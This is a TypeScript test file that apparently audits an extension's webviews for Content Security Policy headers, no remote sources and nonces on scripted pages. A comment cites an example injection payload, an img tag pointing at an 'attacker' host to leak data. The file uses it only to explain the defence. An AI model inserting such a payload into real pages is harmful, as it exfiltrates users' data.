import { describe, expect, it } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';

/**
 * Every webview must declare a Content Security Policy (S-03).
 *
 * The audit found 7 of 11 panels shipping without one. It was not exploitable at
 * the time — those panels run with `enableScripts` off and pass every database
 * value through escapeHtml — but that is precisely the argument for the policy:
 * escaping is a habit maintained by hand, and CSP is what still holds the day
 * someone forgets. Without it, one missed escape on a table name is enough for
 * `<img src="http://attacker/?leak">` to make an outbound request from the panel.
 */

function walk(dir: string, acc: { file: string; text: string }[] = []) {
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walk(p, acc);
    else if (name.endsWith('.ts')) acc.push({ file: p, text: readFileSync(p, 'utf8') });
  }
  return acc;
}

const sources = walk('src');
const htmlProducers = sources.filter((s) => s.text.includes('<!DOCTYPE html>'));

describe('webview security', () => {
  it('finds the webview HTML producers (guards the guard itself)', () => {
    // If this drops to zero the walk broke and every assertion below would pass
    // vacuously. The floor came down from 10 in the Fase O split — the
    // dashboard, advisor and monitor panels moved to the Pro package, where
    // `tests/webviewSecurity.test.ts` applies the same rules to them. The point
    // of the number is to catch a broken walk, not to count features.
    expect(htmlProducers.length).toBeGreaterThanOrEqual(7);
  });

  it('every webview declares a Content Security Policy', () => {
    const missing = htmlProducers
      .filter((s) => !s.text.includes('Content-Security-Policy'))
      .map((s) => s.file);
    expect(missing, `webview HTML without a CSP: ${missing.join(', ')}`).toEqual([]);
  });

  it('no CSP allows remote content by default', () => {
    // `default-src 'none'` (read-only panels) or an explicit cspSource allowlist
    // (the two scripted webviews). A bare `*` or an http: source would let panel
    // content reach the network.
    const loose = htmlProducers
      .filter((s) => /default-src[^"';]*\*/.test(s.text) || /(script|img|style)-src[^"';]*http:/.test(s.text))
      .map((s) => s.file);
    expect(loose, `CSP allows remote content in: ${loose.join(', ')}`).toEqual([]);
  });

  it('only the webviews that need scripting enable it', () => {
    // Every enableScripts:true is a webview whose CSP must carry a nonce.
    // Two remain here: the result grid and the query builder. The third — the
    // performance dashboard, whose range selector posts to the host because
    // only the host may spend a billed GetMetricData call — went to Pro with
    // the rest of the paid dashboard, and its guard went with it.
    const scripted = sources.filter((s) => /enableScripts:\s*true/.test(s.text)).map((s) => s.file);
    expect(scripted.length, 'a new scripted webview appeared — confirm it uses a nonce').toBe(2);
  });

  it('every scripted webview page carries a nonce in its CSP', () => {
    const nonceless = htmlProducers
      .filter((s) => /script-src/.test(s.text) && !/nonce-\$\{/.test(s.text))
      .map((s) => s.file);
    expect(nonceless, `script-src without a nonce in: ${nonceless.join(', ')}`).toEqual([]);
  });
});
